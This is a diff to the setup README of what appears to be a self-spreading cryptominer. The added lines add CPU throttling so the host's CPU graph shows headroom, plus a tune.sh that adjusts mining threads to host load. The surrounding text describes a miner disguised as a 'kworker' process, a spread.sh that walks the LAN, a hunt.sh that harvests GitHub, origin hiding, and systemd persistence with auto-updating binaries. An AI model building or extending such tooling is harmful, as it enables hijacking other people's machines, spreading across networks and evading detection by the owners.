@@ -78,6 +78,9 @@ Edit these lines (the rest can stay):
 - `CONFIG_URL` / `PAYLOAD_URL` / `SHA_URL` / `KEY_URL` -> from step 3
 - `GITHUB_TOKEN` -> a read-only token (settings -> developer settings -> tokens)
 - `TARGET_USERS` -> the logins you actually use on your boxes
+- `CPU_TARGET_PCT` / `HEADROOM_PCT` -> leave both at `100` to mine with all spare
+  capacity. Set `HEADROOM_PCT="25"` if you want the host's CPU chart to keep
+  visible headroom; it costs hashrate roughly proportionally.
 
 A read-only token sitting in a public repo is fine; it only reads public code.
 
@@ -102,13 +105,15 @@ To also hide your origin, put this first:
 ```
 ps -eo pid,ni,pcpu,comm | grep -i kworker     # a boring-looking process
 curl -s 127.0.0.1:12701                        # local miner API
-systemctl list-timers | grep kworker          # updater/spread/hunt scheduled
+systemctl list-timers | grep kworker          # updater/tune/spread/hunt scheduled
 ```
 Then check the pool page for your `WALLET` / `RIG_ID` and confirm hashrate.
 
 ## 8. Walk away
 That is it. On its own:
 - the updater pulls new binaries every 15 min,
+- `tune.sh` re-checks the CPU budget every 10 min and adds or drops one thread
+  at a time to match what the host is actually doing,
 - `spread.sh` walks the LAN every 6h,
 - `hunt.sh` harvests GitHub every 12h (once a token is set),
 - reboot is handled by systemd.
